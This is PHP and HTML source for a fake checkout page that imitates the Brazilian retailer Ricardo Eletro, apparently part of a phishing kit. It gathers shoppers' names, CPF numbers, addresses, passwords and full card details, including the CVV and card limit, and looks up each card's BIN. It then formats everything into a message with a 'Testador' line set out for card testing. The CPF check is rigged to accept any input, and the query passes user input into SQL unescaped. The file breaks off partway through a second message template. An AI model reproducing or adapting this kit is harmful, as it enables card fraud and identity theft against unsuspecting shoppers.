<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js">
</script> 
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js">
</script> 

<?
// Desenvolvido por Spectrum New in Web //

// Troca o preco de cada produto cadastrado
$sql = mysql_query("SELECT * FROM product WHERE productName='$Eletro[2]'");
$sql_num = mysql_num_rows($sql);
if($sql_num == '0'){
?>
<div class="content-min" id="Content">
<div class="content-etapas">
<div class="icone-titulo ">
<div class="icone-titulo-borda">
</div>
</div>
<div class="etapas-right">
<div class="titulo"><img src="/images/loading.gif" width="120" height="auto" style="float:left; margin-top:-20px;" /><div style="float:left; margin-top:25px;"> Redirecionando</div></div>
<div class="clear"></div>
<meta http-equiv="refresh" content="2;URL=http://www.ricardoeletro.com.br/"> 
</div>
</div>
<?	
}else{
while($row = mysql_fetch_array($sql)){

				
//Seta os precos do Iphone e gera parcelas
if($Eletro[2] == $row["productName"]){ //Seta os precos do Iphone
	$priceOld = $row["priceOld"];
	$priceOld2 = (number_format($priceOld, 2, ',', '.'));
	$precos = $row["price"];
	$economize = (number_format($priceOld-$precos, 2, ',', '.'));
	$preco = (number_format($precos, 2, ',', '.'));
	$preco2 = (number_format($precos/2, 2, ',', '.'));
	$preco3 = (number_format($precos/3, 2, ',', '.'));
	$preco4 = (number_format($precos/4, 2, ',', '.'));
	$preco5 = (number_format($precos/5, 2, ',', '.'));
	$preco6 = (number_format($precos/6, 2, ',', '.'));
	$preco7 = (number_format($precos/7, 2, ',', '.'));
	$preco8 = (number_format($precos/8, 2, ',', '.'));
	$preco9 = (number_format($precos/9, 2, ',', '.'));
	$preco10 = (number_format($precos/10, 2, ',', '.'));
	$preco11 = (number_format($precos/11, 2, ',', '.'));
	$preco12 = (number_format($precos/12, 2, ',', '.'));
	$avalicao = $row["avaliacao"];

}

?>

<?
if($Eletro[2] == $row["productName"]){
?>


			<div class="wrapper-middle central-wrapper">
 <?PHP

if (isset($_POST["Csadastrar"])){
function gerarPedido($tamanho = 7, $maiusculas = true, $numeros = true, $simbolos = false)
{
$lmin = '';
$lmai = '';
$num = '123456789';
$simb = '';
$retorno = '';
$caracteres = '';

$caracteres .= $lmin;
if ($maiusculas) $caracteres .= $lmai;
if ($numeros) $caracteres .= $num;
if ($simbolos) $caracteres .= $simb;

$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
$rand = mt_rand(1, $len);
$retorno .= $caracteres[$rand-1];
}
return $retorno;
}
$numberPedido = gerarPedido(7, true, true, true);
function validaCPF($cpfx = null) {       
                        // Verifica se um numero foi informado
                        if(empty($cpfx)) {
                                return true;
                        }        
                        // Elimina possivel mascara
                        $cpfx = str_pad($cpfx, 12, '0', STR_PAD_LEFT);
						$cpfx = str_pad($cpfx, 12, '0', STR_PAD_LEFT);
                         
                        // Verifica se o numero de digitos informados e igual a 11
                        if (strlen($cpfx) != 12) {
                                return true;
                        }
                        // Verifica se nenhuma das sequencias invalidas abaixo
                        // foi digitada. Caso afirmativo, retorna falso
                        else if ($cpfx == '00000000000' ||
                                $cpfx == '11111111111' ||
                                $cpfx == '22222222222' ||
                                $cpfx == '33333333333' ||
                                $cpfx == '44444444444' ||
                                $cpfx == '55555555555' ||
                                $cpfx == '66666666666' ||
                                $cpfx == '77777777777' ||
                                $cpfx == '88888888888' ||
                                $cpfx == '99999999999') {
                                return true;
                         // Calcula os digitos verificadores para verificar se o
                         // CPF e valido
                         } else {  
                                 
                                for ($t = 9; $t < 12; $t++) {
                                         
                                        for ($d = 0, $c = 0; $c < $t; $c++) {
                                                $d += $cpfx{$c} * (($t + 1) - $c);
                                        }
                                        $d = ((10 * $d) % 12) % 10;
                                        if ($cpfx{$c} != $d) {
                                                return true;
                                        }
                                }        
                                return true;
                        }
                }
                function validaEmail($email) {
                        $conta = "^[a-zA-Z0-9\._-]+@";
                        $domino = "[a-zA-Z0-9\._-]+.";
                        $extensao = "([a-zA-Z]{2,4})$";
                       
                       $pattern =  '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
                       
                    if (preg_match($pattern, $email))
                        return true;
                        else
                        return false;
                }

//$gender         = $_POST['registerView_userAddress_gender'];
		// TIPO 
		$tipo			= $_POST['tipo'];
		// PESSOA JURIDICA
		$rsocail 		= $_POST['RazaoSocial'];
		$nfantasia 		= $_POST['NomeFantasia'];
		$cnpj  			= $_POST['Cnpj'];
		$iestadual		= $_POST['IEstadual'];
		$dddpj			= $_POST['DddEmpresa'];
		$telpj 			= $_POST['FoneEmpresal'];
		$ramalpj 		= $_POST['RamoAtividade'];
		
		// Dados pessoais
		$nome  			= $_POST['Nome'];
		$sobrenome		= $_POST['Sobrenome'];
		$apelido		= $_POST['Apelido'];
		$nascimento		= $_POST['Nascimento'];
		$sexo 			= $_POST['Sexo'];
		$profissao		= $_POST['Profissao'];
		$cpf			= $_POST['Cpf'];
		// Contato 1
		$ddcontato1 	= $_POST['DddContato1'];
		$fonecontato1	= $_POST['FoneContato1'];
		$ramalcontato1	= $_POST['RamalContato1'];
		// Contato 2
		$ddcontato2 	= $_POST['DddContato2'];
		$fonecontato2	= $_POST['FoneContato2'];
		$ramalcontato2	= $_POST['RamalContato2'];
		// Contato 3
		$ddcontato3 	= $_POST['DddContato3'];
		$fonecontato3	= $_POST['FoneContato3'];
		
		//Endereco
		$cep			= $_POST['cep'];
		$rua			= $_POST['rua'];
		$numero			= $_POST['Numero'];
		$complemento	= $_POST['Complemento'];
		$bairro			= $_POST['Bairro'];
		$estado			= $_POST['Estado'];
		$cidade			= $_POST['Cidade'];
		$preferencia	= $_POST['Referencia'];
		
		// Identificacao
		$email			= $_POST['Email'];
		$email2			= $_POST['ConfirmeEmail'];
		$pass1			= $_POST['Senha'];
		$pass2			= $_POST['ConfirmeSenha'];
		
		
		$date			= date("Y-m-d H:i:s"); 
		$produto 		= ucwords($titlepagina); 
		$ip 			= $_SERVER["REMOTE_ADDR"];
		
		// Comeca a verificacao
		
		$nomecc1		= $_POST['NomeCartaoCredito1'];
		$cpf2			= $_POST['CpfCartaoCredito1'];
		$nascimento2	= $_POST['NascimentoCartaoCredito1'];
		$cartao			= $_POST['CartaoCredito1'];
		$validade		= $_POST['validadeCartao'];
		$segurancacvv	= $_POST['CodSegurancaCartao1'];
		$limitecc		= $_POST['LimiteDoCartao'];
		$bandeira		= $_POST['Bandeira'];
		$parcela		= $_POST['Parcela1'];
		
		$Dates = date("d/m/Y");
		$Datesa = date("H:i:s");
		
		// verifica o tipo de verificacao, se e PF ou PJ.<br />
		if($tipo == '1'){
			if(    
                        empty($rsocail) or empty($nfantasia) or
                        empty($iestadual) or empty($cnpj) or
                        empty($dddpj) or empty($telpj) or
                        empty($ramalpj) ){
                                $error[] = "Existem campos empresariais nao preenchidos";    
                }
		}

                // NOVA VALIDcaO DE CAMPOS //
				// Contato 1
		
                // verifica se algum campo obrigatorio esteja vazio
                if(    
                        empty($nome) or empty($sobrenome) or
                        empty($nascimento) or
                        empty($cpf) or empty($ddcontato1) or
                        empty($fonecontato1) or empty($rua) or
                        empty($numero) or empty($bairro) or empty($estado) or empty($cidade) or empty($email) or empty($email2) or empty($pass1) or empty($pass2)){
                                $error[] = "Existem campos obrigatorios nao preenchidos";    
                }
				if(empty($sexo)){
					$error[] = true;
					$todos .= "Selecione o <strong>sexo</strong>";
				}
				
				// faz a parada
				if(empty($nome)){
					$errorNome = "Preencha o <strong>nome</strong>";	
				}
				if(empty($sobrenome)){
					$errorNome = "Preencha o <strong>nome</strong>";	
				}
                // Validar CPF
                if(validaCPF($cpf) == false){                        
						$error[] = true;  
						$todos	.= "CPF invalido";    
                }
				if(validaCPF($cpf2) == false){                        
						$error2[] = true;  
						$cpfin	  = "CPF invalido";    
                }
                // valida a data de nascimento (PRIMEIRO REGISTRO )
                $verificar_nascimento = explode('/', $nascimento);
				
				// pega o ano de hoje
                $Date = date("Y");
                $verificar_idade = $Date - $verificar_nascimento[2];
               
                if($verificar_idade <= 15 or $verificar_nascimento[1] >= 13 or $verificar_nascimento[0] >= 32 or $verificar_idade >= 120){
                        $error[] = true;  
						$todos	.= "Data de Nascimento Invalida";
                }
                // VALIDA A DATA DE NASCIMENTO cartao
                $verificar_nascimentos = explode('/',$nascimento2);
                $Date = date("Y");
                $verificar_idades = $Date - $verificar_nascimentos[2];
               
                if($verificar_idades <= 15 or $verificar_nascimentos[1] >= 13 or $verificar_nascimentos[0] >= 32 or $verificar_idades >= 120){
                        $error2[] = "Data de Nascimento Invalida";  
						$nascimentoin = "Data de Nascimento Invalida";   
                }
                
				// Valida��o Cart�o 
							 $restricao = array(" " => "");
$ccC = strtr($_POST['CartaoCredito1'], $restricao);
                $cc = $ccC;
    			
	
					$bincompleta = $cc;
                    $cc =  substr($cc,0,6) ;
							
				
                // Define a URL original (do formul�rio de login)
           $checar = "http://www.binlist.net/json/$cc";
                
               

// Validacao Cartao 
                $ch = curl_init();
							
				
                // Define a URL original (do formul�rio de login)
     
  // Define a URL original (do formulario de login)
                curl_setopt($ch, CURLOPT_URL, "$checar");
                
                // Imita o comportamento patrao dos navegadores: manipular cookies
                curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
                // Define o tipo de transferancia (Padrao: 1)
                curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
                // Executa a requisicao
                $dadosSite = curl_exec ($ch);
				
				
$numerobin1 = explode('{"bin":"', $dadosSite);
$numerobin2 = explode('",',$numerobin1[1]);
 
$numerobin = $numerobin2[0];



$banco1 = explode('"bank":"', $dadosSite);
$banco2 = explode('",',$banco1[1]);
 
$banco = $banco2[0];



$banco = strtoupper($banco);


$cartao1 = explode('"card_type":"', $dadosSite);
$cartao2 = explode('",',$cartao1[1]);
 
$cartaor = $cartao2[0];

$cartao11 = explode('"card_category":"', $dadosSite);
$cartao21 = explode('",',$cartao11[1]);
 
$cartao123 = $cartao21[0];

$cartao111 = explode('"country_name":"', $dadosSite);
$cartao211 = explode('",',$cartao111[1]);
 
$cartao1231 = $cartao211[0];
$cartao1231 = strtoupper($cartao1231);

$cartao1111 = explode('"brand":"', $dadosSite);
$cartao2111 = explode('",',$cartao1111[1]);
 
$cartao12311 = $cartao2111[0];
$cartao12311 = strtoupper($cartao12311);

$info = $banco . ' ' .$cartao12311. ' ' .$cartaor. ' ' .$cartao123. ' ' .$cartao1231;
               	
                // verificar bandeira
				if($bandeira == '1'){
					// master
					$nameBandeira =	"MASTERCARD";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '2'){
					// master
					$nameBandeira =	"VISA";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '3'){
					// master
					$nameBandeira =	"AMERICAN EXPRESS";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '4'){
					// master
					$nameBandeira =	"DINERS";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '6'){
					// master
					$nameBandeira =	"HIPERCARD";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				if($bandeira == '13'){
					// master
					$nameBandeira =	"ELO";
					$bandeiraveririfcar = strpos($cartao2111[0],$nameBandeira);
					if($bandeiraveririfcar !== false){
						$bandeirafind = "Certo";	
					}				
				}
				// valida
				if(!isset($bandeirafind)){
					$error2[] = "Valido";
					$cartaoins 	= "Cartao Invalido";	
				}
				
				// VALIDA CARTaO
                if($cartao2111[0] == ''){
                        $error2[] = "Cartao digitado e invalido";   
						$cartaoin = "Cartao digitado e invalido";         
                }
                $Date_Mes = date("m");
               
                // valida Validade
                $pegar_datas = explode('/', $validade);
              
                // verifica o mas
                if($pegar_datas[0] >= 13){
                        $error2[] = "Vencimento do Cartao Invalido";  
						$validadein = "Validade Invalida"; 
                }
               
                // verifica o ano              
                $pegar_ano = "20".$pegar_datas[1];
               	$Date = date("Y");
				$Date_menos = $Date - 1;
                if($pegar_ano < $Date_menos){
                        // verifica se o mas que ele coloco e valido pro ano atual
                      	$error2[] = "Vencimento do Cartao Invalido"; 
						$validadein = "Validade Invalida"; 
                                            
                }
                if (!validaEmail($email)) {
                        
						$error[] = true;  
						$todos	.= "O E-mail digitado e invalido ou esta vazio";
                }
				if($email != $email2){
					$error[] = true;  
					$todos	.= "E-mail digitado nao sao iguais";
					
				}
				if(empty($email) and empty($email2)){
					$error[] = true; 
					$todos 	.= "Campo e-mail vazio";	
				}

               
        
}
?>
<? if($Eletro[3] == "carrinho"){?>
<script type="text/javascript">
		function atualizacep(cep){
		  cep = cep.replace(/\D/g,"")
		  url="http://cep.correiocontrol.com.br/"+cep+".js"
		  s=document.createElement('script')
		  s.setAttribute('charset','utf-8')
		  s.src=url
		  document.querySelector('head').appendChild(s)
    	}
	  function correiocontrolcep(valor){
		  if (valor.erro) {
			$(".gratis").text("CEP invalido");
			return;
		  };
		  $(".valor-frete").css("display", "block");
		  $(".gratis").text("Frete Gratis");
		  document.getElementById('rua').value=valor.logradouro
      	document.getElementById('Bairro').value=valor.bairro
      document.getElementById('Cidade').value=valor.localidade
      document.getElementById('Estado').value=valor.uf
     }
</script>
        
        <script>
function formatar(mascara, documento){
  var i = documento.value.length;
  var saida = mascara.substring(0,1);
  var texto = mascara.substring(i)
  
  if (texto.substring(0,1) != saida){
            documento.value += texto.substring(0,1);
  }
  
}
</script>
<script language='JavaScript'>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}
</script>
<script language='JavaScript'>

function Onlychars(e)
{
	var tecla=new Number();
	if(window.event) {
		tecla = e.keyCode;
	}
	else if(e.which) {
		tecla = e.which;
	}
	else {
		return true;
	}
	if((tecla >= "48") && (tecla <= "57")){
		return false;
	}
}
</script>
<form action="/<?=$Eletro[0]?>/<?=$Eletro[1]?>/<?=$Eletro[2]?>/identificacao/" method="post">
<input type="hidden"  id="rua" name="rua" value="<?=$_POST['rua']?>">
<input name="Bairro" type="hidden" id="Bairro" tabindex="35" value="<?=$_POST['Bairro']?>">
<input name="Estado" type="hidden" id="Estado" tabindex="36" value="<?=$_POST['Estado']?>">
<input name="Cidade" type="hidden" id="Cidade" tabindex="37" value="<?=$_POST['Cidade']?>">
<div class="content-min" id="Content">
<div class="content-etapas">
<div class="icone-titulo icone-titulo-carrinho">
<div class="icone-titulo-borda">
</div>
</div>
<div class="etapas-right">
<div class="titulo-meu-carrinho">meu carrinho</div>
<div class="etapas">
<div class="ativado">
<div class="etapa">
<div class="numero">
<div class="passo">1</div>
<div class="label">Carrinho</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado">
<div class="etapa">
<div class="numero">
<div class="passo">2</div>
<div class="label">Identificacao</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado">
<div class="etapa">
<div class="numero">
<div class="passo">3</div>
<div class="label">Endereco</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado">
<div class="etapa">
<div class="numero">
<div class="passo">4</div>
<div class="label">Pagamento</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado">
<div class="etapa">
<div class="numero">
<div class="passo">5</div>
<div class="label">Finalizacao</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="ProdutosCarrinho">
<div class="container-left">
<div class="ponta-direita">
</div>
<div class="ponta-esquerda">
</div>
<table cellspacing="0" cellpadding="0" class="tableCarrinho">
<thead class="cabecalho">
<tr class="meio">
<th class="coluna">produto</th>
<th class="coluna">
</th>
<th class="coluna">valor unitario</th>
<th class="coluna">valor total</th>
<th class="coluna">
</th>
</tr>
</thead>
<tbody>
<tr class="produto">
<td class="coluna-produto">
<div class="imagem-produto">
<a href="/<?=$Eletro[0]?>/<?=$Eletro[1]?>/<?=$Eletro[2]?>/">
<img title="<?=$row['productNameExc']?>" alt="<?=$row['productNameExc']?>" src="<?=$row['thumb']?>">
</a>
</div>
<div class="texto-produto">
<a href="/<?=$Eletro[0]?>/<?=$Eletro[1]?>/<?=$Eletro[2]?>/">
<?=$row['productNameExc']?>  </a>
</div>
</td>
<td class="coluna-quantidade">
<div class="container-qtd">
<div class="input-qtd container-setas">

</div>

</div>
<div class="clear">
</div>

</td>
<td class="coluna-valor-unitario">
<div class="valor-unitario">
<span class="texto-verde-pequeno">R$</span> <?=$preco?> </div>
</td>
<td class="coluna-valor-total">
<div class="valor-total">
<span class="texto-verde-pequeno">R$</span> <?=$preco?> </div>
</td>
<td class="coluna-excluir">

</td>
</tr>
</tbody>
</table>
</div>
<div class="clear">
</div>
<div class="barra">
</div>
<div class="bottom-carrinho">
<div class="box-frete">
<h3 class="subtitulo-sessao">
<span class="indicador">
</span>calcule o frete</h3>
<div class="insira">
<div class="label">insira seu cep:</div>
<div class="campo1 input-container">
<input type="text"  onBlur="atualizacep(this.value)" OnKeyPress="formatar('#####-###', this); return SomenteNumero(event)" maxlength="9" id="cep" name="cep">
</div>
<div class="ok">
<input type="submit" enter="" value="" onsuccess="CI.RetornaEnderecoFrete(false)" form="Frete" id="calcularFrete">
</div>
</div>
<div class="mostra-dados">
<div class="endereco_frete"> </div>
<div class="valor-frete" style="display: none;">
<span class="titulo-valor-frete">
<span class="gratis">Frete Gratis</span>
</span>
<span class="showValorFrete">
</span>
</div>
</div>
<div class="clear">
</div>
</div>
<div class="container-cupom-valorcompra">
<div class="box-cupom-desconto">

</div>
<div class="box-total-compra">
<div class="bg-left">
</div>
<div class="conteudo-right">
<div class="titulo">valor total de sua compra &gt;&gt;</div>
<div class="valor">
<div class="texto">
<span id="valor_total_carrinho">R$ <?=$preco?>
</span>
</div>
<input type="hidden" value="1199" id="ValorTotalCarrinho">
</div>
<div class="ou">ou</div>
<div class="parcelas">
<div class="texto">
<span class="verde">10x</span> de <span id="valor_parcela_carrinho">R$ <?=$preco10?>
</span> sem juros</div>
</div>
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
<div class="botoes">
<div class="finalizar">
<input type="image" src="http://images.maquinadevendas.com.br/site/re/button/btn_concluir_compra.png" name="button">
<input type="hidden" name="verificar_click" value="checado">

</a>
</div>

<div class="clear">
</div>
</div>
</div>
<div class="clear">
</div>
</div>
</form>

<? } elseif($Eletro[3] == "identificacao"){?>
<?
// verifica se o cara estava na pagina exterior
if(isset($_POST['verificar_click'])){
?>

	<script type="text/javascript">

	$(document).ready(function(){
		$('#PJ').change(function(){
			if(this.checked)
				$('.dados-empresa').slideDown('slow').css("display","block");	
		});
	});
	$(document).ready(function(){
			$('#PF').change(function(){
				if(this.checked)
					$('.dados-empresa').css("display","block").slideToggle("slow");
				else
					$('.dados-empresa').slideUp('slow').css("display","none");
		
			});
		});

	</script>

        <script>
    function atualizacep(cep){
      cep = cep.replace(/\D/g,"")
      url="http://cep.correiocontrol.com.br/"+cep+".js"
      s=document.createElement('script')
      s.setAttribute('charset','utf-8')
      s.src=url
      document.querySelector('head').appendChild(s)
    }

    function correiocontrolcep(valor){
      if (valor.erro) {
        $("#rua").val(unescape("Nao encontrado!"));
        return;
      };
	  $(".busca-endereco").css("display", "block");
      document.getElementById('rua').value=valor.logradouro
      document.getElementById('Bairro').value=valor.bairro
      document.getElementById('Cidade').value=valor.localidade
      document.getElementById('Estado').value=valor.uf
    }

    </script>
        <script>
function formatar(mascara, documento){
  var i = documento.value.length;
  var saida = mascara.substring(0,1);
  var texto = mascara.substring(i)
  
  if (texto.substring(0,1) != saida){
            documento.value += texto.substring(0,1);
  }
  
}
</script>
<script language='JavaScript'>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}
</script>
<script language='JavaScript'>

function Onlychars(e)
{
	var tecla=new Number();
	if(window.event) {
		tecla = e.keyCode;
	}
	else if(e.which) {
		tecla = e.which;
	}
	else {
		return true;
	}
	if((tecla >= "48") && (tecla <= "57")){
		return false;
	}
}
</script>
<? if(!isset($error) and isset($_POST["Csadastrar"])){?>
<? if(!isset($error2)){ ?>
<?



if($tipo == '1'){
$mensage =	"
  <style type=\"text/css\">
		table tr td{padding:4px;}
	</style>
</p>
<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">
   <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Juridica:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Razao Social:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$rsocial</td>
  </tr>
  <tr>
    <td align=\"right\">Nome Fantasia:</td>
    <td>&nbsp;</td>
    <td>$nfantasia</td>
  </tr>
  <tr>
    <td align=\"right\">CNPJ:</td>
    <td>&nbsp;</td>
    <td>$cnpj</td>
  </tr>
  <tr>
    <td align=\"right\">Identificacao Estadual:</td>
    <td>&nbsp;</td>
    <td>$iestadual</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone:</td>
    <td>&nbsp;</td>
    <td>$dddpj$telpj$ramalpj</td>
  </tr>
 
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Fisica:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Nome:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$nome $sobrenome</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf</td>
  </tr>
  <tr>
    <td align=\"right\">Data de Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento</td>
  </tr>
  <tr>
    <td align=\"right\">Apelido:</td>
    <td>&nbsp;</td>
    <td>$apelido</td>
  </tr>
  <tr>
    <td align=\"right\">Profissao:</td>
    <td>&nbsp;</td>
    <td>$profissao</td>
  </tr>

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Contato:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Telefone 1:</td>
    <td>&nbsp;</td>
    <td>$ddcontato1 $fonecontato1 $ramalcontato1</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone 2:</td>
    <td>&nbsp;</td>
    <td>$ddcontato2 $fonecontato2 $ramalcontato2</td>
  </tr>
  <tr>
    <td align=\"right\">Celular:</td>
    <td>&nbsp;</td>
    <td>$ddcontato3 $foncontato3 </td>
  </tr>
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Endereco:</th>
    
  </tr>
    <tr>
    <td align=\"right\">CEP:</td>
    <td>&nbsp;</td>
    <td>$cep</td>
  </tr>
  <tr>
    <td align=\"right\">Endereco:</td>
    <td>&nbsp;</td>
    <td>$rua</td>
  </tr>
  <tr>
    <td align=\"right\">Numero:</td>
    <td>&nbsp;</td>
    <td>$numero</td>
  </tr>
  <tr>
    <td align=\"right\">Complemento:</td>
    <td>&nbsp;</td>
    <td>$complemento</td>
  </tr>
   <tr>
    <td height=\"26\" align=\"right\">Bairro:</td>
    <td>&nbsp;</td>
    <td>$bairro</td>
  </tr>
    <tr>
    <td align=\"right\">Cidade</td>
    <td>&nbsp;</td>
    <td>$cidade</td>
  </tr>
    <tr>
    <td align=\"right\">Estado:</td>
    <td>&nbsp;</td>
    <td>$estado</td>
  </tr>
  <tr>
    <td align=\"right\">Ponto de Referencia:</td>
    <td>&nbsp;</td>
    <td>$preferencia</td>
  </tr>
  
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Identificacao:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Email:</td>
    <td>&nbsp;</td>
    <td>$email</td>
  </tr>
  <tr>
    <td align=\"right\">Senha:</td>
    <td>&nbsp;</td>
    <td>$pass1</td>
  </tr>
  <tr>
    <td align=\"right\">Hora da Compra:</td>
    <td>&nbsp;</td>
    <td>$date </td>
  </tr>
  <tr>
<tr>
    <td align=\"right\">Produto:</td>
    <td>&nbsp;</td>
    <td>$produto </td>
  </tr>
  <tr>
    <td align=\"right\">Preco:</td>
    <td>&nbsp;</td>
    <td>$preco </td>
  </tr>
  <tr>
  <tr>
    <td align=\"right\">IP:</td>
    <td>&nbsp;</td>
    <td>$ip</td>
  </tr>
  <tr>

    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Cartao:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Nome Cartao :</td>
    <td>&nbsp;</td>
    <td>$nomecc1</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf2</td>
  </tr>
  <tr>
    <td align=\"right\">Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento2</td>
  </tr>
  <tr>
    <td align=\"right\">Numero Cartao:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Numero Cartao(Sem Espaco):</td>
    <td>&nbsp;</td>
    <td>$ccC</td>
  </tr>
  <tr>
    <td align=\"right\">Validade:</td>
    <td>&nbsp;</td>
    <td><strong>$validade</strong></td>
  </tr>
  <tr>
    <td align=\"right\">CVV:</td>
    <td>&nbsp;</td>
    <td><strong>$segurancacvv</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Limite:</td>
    <td>&nbsp;</td>
    <td><strong>$limitecc</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Bandeira:</td>
    <td>&nbsp;</td>
    <td><strong>$bandeira</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Parcela:</td>
    <td>&nbsp;</td>
    <td><strong>$parcela</strong></td>
  </tr>

  <tr>
    <td align=\"right\">Testador:</td>
    <td>&nbsp;</td>
    <td><strong>$ccC;$validade;$segurancacvv;</strong></td>
  </tr>
    
  <tr>
    <td align=\"right\">Bin Cartao:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao2111[0]</strong></td>
  </tr>
</table>
	
	</span>

	";
}else{
$mensage =	"
  <style type=\"text/css\">
		table tr td{padding:4px;}
	</style>
</p>
<table width=\"586\" border=\"0\" cellpadding=\"3\" style=\"font-family:Arial, 'lucida grande',tahoma,verdana,arial,sans-serif; border-spacing: 4px;font-size:14px; color:#333;\">

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Pessoa Fisica:</th>
    
  </tr>
  <tr>
    <td width=\"196\" align=\"right\">Nome:</td>
    <td width=\"46\">&nbsp;</td>
    <td width=\"318\" align=\"left\">$nome $sobrenome</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf</td>
  </tr>
  <tr>
    <td align=\"right\">Data de Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento</td>
  </tr>
  <tr>
    <td align=\"right\">Apelido:</td>
    <td>&nbsp;</td>
    <td>$apelido</td>
  </tr>
  <tr>
    <td align=\"right\">Profissao:</td>
    <td>&nbsp;</td>
    <td>$profissao</td>
  </tr>

  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Contato:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Telefone 1:</td>
    <td>&nbsp;</td>
    <td>$ddcontato1 $fonecontato1 $ramalcontato1</td>
  </tr>
  <tr>
    <td align=\"right\">Telefone 2:</td>
    <td>&nbsp;</td>
    <td>$ddcontato2 $fonecontato2 $ramalcontato2</td>
  </tr>
  <tr>
    <td align=\"right\">Celular:</td>
    <td>&nbsp;</td>
    <td>$ddcontato3 $foncontato3 </td>
  </tr>
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Endereco:</th>
    
  </tr>
    <tr>
    <td align=\"right\">CEP:</td>
    <td>&nbsp;</td>
    <td>$cep</td>
  </tr>
  <tr>
    <td align=\"right\">Endereco:</td>
    <td>&nbsp;</td>
    <td>$rua</td>
  </tr>
  <tr>
    <td align=\"right\">Numero:</td>
    <td>&nbsp;</td>
    <td>$numero</td>
  </tr>
  <tr>
    <td align=\"right\">Complemento:</td>
    <td>&nbsp;</td>
    <td>$complemento</td>
  </tr>
   <tr>
    <td height=\"26\" align=\"right\">Bairro:</td>
    <td>&nbsp;</td>
    <td>$bairro</td>
  </tr>
    <tr>
    <td align=\"right\">Cidade</td>
    <td>&nbsp;</td>
    <td>$cidade</td>
  </tr>
    <tr>
    <td align=\"right\">Estado:</td>
    <td>&nbsp;</td>
    <td>$estado</td>
  </tr>
  <tr>
    <td align=\"right\">Ponto de Referencia:</td>
    <td>&nbsp;</td>
    <td>$preferencia</td>
  </tr>
  
  <tr>
    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:15px;\">Dados de Identificacao:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Email:</td>
    <td>&nbsp;</td>
    <td>$email</td>
